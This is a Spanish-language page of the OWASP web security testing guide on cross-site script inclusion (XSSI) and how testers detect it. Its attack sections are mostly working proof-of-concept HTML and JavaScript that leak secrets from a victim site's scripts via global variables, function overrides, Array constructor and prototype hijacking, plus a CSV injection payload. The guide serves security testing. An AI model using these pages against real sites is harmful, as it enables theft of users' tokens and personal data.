# Inclusión de scripts entre sitios

|ID          |
|------------|
|WSTG-CLNT-13|

## Resumen

La vulnerabilidad de inclusión de scripts entre sitios (Cross Site Script Inclusion, XSSI) permite la filtración de datos sensibles a través de límites entre orígenes o dominios. Los datos sensibles podrían incluir datos relacionados con la autenticación (estados de inicio de sesión, cookies, tokens de autenticación, ID de sesión, etc.) o datos personales o personales sensibles del usuario (direcciones de correo electrónico, números de teléfono, datos de tarjetas de crédito, números de seguro social, etc.). XSSI es un ataque del lado del cliente similar a la falsificación de solicitudes entre sitios (Cross Site Request Forgery, CSRF), pero tiene un propósito diferente. Mientras que CSRF utiliza el contexto del usuario autenticado para ejecutar determinadas acciones que cambian el estado dentro de la página de una víctima (por ejemplo, transferir dinero a la cuenta del atacante, modificar privilegios, restablecer la contraseña, etc.), XSSI utiliza JavaScript del lado del cliente para filtrar datos sensibles de sesiones autenticadas.

De forma predeterminada, los sitios web solo pueden acceder a datos si proceden del mismo origen. Este es un principio clave de seguridad de las aplicaciones y se rige por la política del mismo origen (definida en [RFC 6454](https://tools.ietf.org/html/rfc6454)). Un origen se define como la combinación del esquema URI (HTTP o HTTPS), el nombre de host y el número de puerto. Sin embargo, esta política no se aplica a las inclusiones de etiquetas HTML `<script>`. Esta excepción es necesaria, ya que, sin ella, los sitios web no podrían consumir servicios de terceros, realizar análisis del tráfico ni usar plataformas publicitarias, entre otras cosas.

Cuando el navegador abre un sitio web con etiquetas `<script>`, los recursos se obtienen del dominio de otro origen. Luego, los recursos se ejecutan en el mismo contexto que el sitio que los incluye o que el navegador, lo que crea la posibilidad de filtrar datos sensibles. En la mayoría de los casos, esto se logra mediante JavaScript; sin embargo, la fuente del script no tiene que ser un archivo JavaScript de tipo `text/javascript` ni tener la extensión `.js`.

Vulnerabilidades históricas de los navegadores (como las de IE9/10) permitían la filtración de datos mediante mensajes de error detallados en tiempo de ejecución. Esta técnica ya no representa el comportamiento de los navegadores modernos. Al establecer el atributo charset de la etiqueta `<script>`, un atacante o evaluador puede forzar la codificación UTF-16, lo que en algunos casos permite filtrar datos en otros formatos (por ejemplo, JSON). Para obtener más información sobre estos ataques, consulta [Ataques XSSI basados en identificadores](https://www.mbsd.jp/Whitepaper/xssi.pdf).

## Objetivos de prueba

- Localizar datos sensibles en todo el sistema.
- Evaluar la filtración de datos sensibles mediante diversas técnicas.

## Cómo probar

### Consideraciones sobre las cookies SameSite

Los ejemplos siguientes dependen de que el navegador envíe la cookie de autenticación de la víctima en una solicitud `<script src="...">` entre sitios; se trata de una carga de subrecurso, no de una navegación de nivel superior. Según el comportamiento de [`SameSite`](../06-Session_Management/02-Cookies_Attributes.md#samesite-attribute) descrito en la sección Atributos de las cookies, las cookies `Lax` no se envían en solicitudes de subrecursos. Por lo tanto, de forma predeterminada, estas pruebas de concepto no filtrarán datos en un navegador cuyo valor predeterminado sea `Lax` (los basados en Chromium, desde Chrome 80), a menos que la cookie de sesión establezca explícitamente `SameSite=None; Secure`.

Esto no significa que se haya corregido la vulnerabilidad subyacente; solo significa que reproducirla depende ahora de la configuración `SameSite` de la cookie y del navegador que se esté probando. Comprueba directamente el encabezado `Set-Cookie` y, si una prueba de concepto no se ejecuta, vuelve a probar en un navegador cuyo valor predeterminado no sea `Lax` (por ejemplo, Firefox).

### Recopilar datos usando sesiones de usuario autenticadas y no autenticadas

Identifica qué endpoints se encargan de enviar datos sensibles, qué parámetros son necesarios e identifica todas las respuestas JavaScript pertinentes, generadas de forma dinámica y estática, usando sesiones de usuario autenticadas. Presta especial atención a los datos sensibles enviados mediante [JSONP](https://en.wikipedia.org/wiki/JSONP). Para encontrar respuestas JavaScript generadas dinámicamente, genera solicitudes autenticadas y no autenticadas y luego compáralas. Si son diferentes, significa que la respuesta es dinámica; de lo contrario, es estática. Para simplificar esta tarea, se puede usar una herramienta como el [complemento de proxy Burp de Veit Hailperin](https://github.com/luh2/DetectDynamicJS). Asegúrate de comprobar otros tipos de archivos además de JavaScript; XSSI no se limita únicamente a los archivos JavaScript.

### Determinar si los datos sensibles pueden filtrarse usando JavaScript

Los evaluadores deberían analizar el código en busca de los siguientes mecanismos de filtración de datos mediante vulnerabilidades XSSI:

1. Variables globales
2. Parámetros de funciones globales
3. Robo de CSV (valores separados por comas) mediante comillas
4. Encadenamiento de prototipos usando `this`

### 1. Filtración de datos sensibles mediante variables globales

Una clave de API se almacena en un archivo JavaScript con el URI `https://victim.com/internal/api.js` en el sitio web de la víctima, `victim.com`, al que solo pueden acceder los usuarios autenticados. Un atacante configura un sitio web, `attackingwebsite.com`, y utiliza la etiqueta `<script>` para hacer referencia al archivo JavaScript.

Estos son los contenidos de `https://victim.com/internal/api.js`:

```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

El sitio del atacante, `attackingwebsite.com`, tiene un `index.html` con el siguiente código:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

En este ejemplo, una víctima está autenticada en `victim.com`. Un atacante atrae a la víctima a `attackingwebsite.com` mediante ingeniería social, correos electrónicos de phishing, etc. El navegador de la víctima obtiene entonces `api.js`, lo que provoca que los datos sensibles se filtren mediante la variable global de JavaScript y se muestren usando `innerHTML`.

### 2. Filtración de datos sensibles mediante parámetros de funciones globales

Este ejemplo es similar al anterior, excepto que, en este caso, `attackingwebsite.com` usa una función global de JavaScript para extraer los datos sensibles, sobrescribiendo la función global de JavaScript de la víctima.

Estos son los contenidos de `https://victim.com/internal/api.js`:

```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

El sitio del atacante, `attackingwebsite.com`, tiene un `index.html` con el siguiente código:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

Otras vulnerabilidades XSSI también pueden provocar la filtración de datos sensibles mediante cadenas de prototipos de JavaScript o llamadas a funciones globales. Para obtener más información sobre estos ataques, consulta [Los peligros inesperados de JavaScript dinámico](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).

### 3. Filtración de datos sensibles mediante el robo de CSV con comillas

Para filtrar datos, el atacante o evaluador debe poder inyectar código JavaScript en los datos CSV. El siguiente código de ejemplo es un extracto del documento técnico de Takeshi Terada [Ataques XSSI basados en identificadores](https://www.mbsd.jp/Whitepaper/xssi.pdf).

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

En este ejemplo, usar las columnas `___` como puntos de inyección e insertar cadenas JavaScript en su lugar da como resultado lo siguiente:

```text
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

En 2006, [Jeremiah Grossman escribió sobre una vulnerabilidad similar en Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) que permitía extraer contactos de usuarios en JSON. En este caso, el navegador recibía los datos de Gmail y su motor JavaScript los analizaba usando un constructor Array sin referencia para filtrar los datos. Un atacante podía acceder a este Array con los datos sensibles definiendo y sobrescribiendo el constructor Array interno de la siguiente manera:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. Filtración de datos sensibles mediante encadenamiento de prototipos usando `this`

En JavaScript, la palabra clave `this` tiene ámbito dinámico. Esto significa que, si se llama a una función sobre un objeto, `this` apuntará a ese objeto aunque la función llamada no pertenezca al objeto. Este comportamiento puede usarse para filtrar datos. En el siguiente ejemplo de la [página de demostración de Sebastian Leike](https://web.archive.org/web/20210107144812/http://sebastian-lekies.de/leak/), los datos sensibles se almacenan en un Array. Un atacante puede sobrescribir `Array.prototype.forEach` con una función controlada por el atacante. Si algún código llama a la función `forEach` en una instancia de array que contiene valores sensibles, se invocará la función controlada por el atacante con `this` apuntando al objeto que contiene los datos sensibles.

Aquí hay un extracto de un archivo JavaScript que contiene datos sensibles, `javascript.js`:

```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...
```

Los datos sensibles pueden filtrarse con el siguiente código JavaScript:

```html
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="https://victim.com/..../javascript.js"></script>
...
```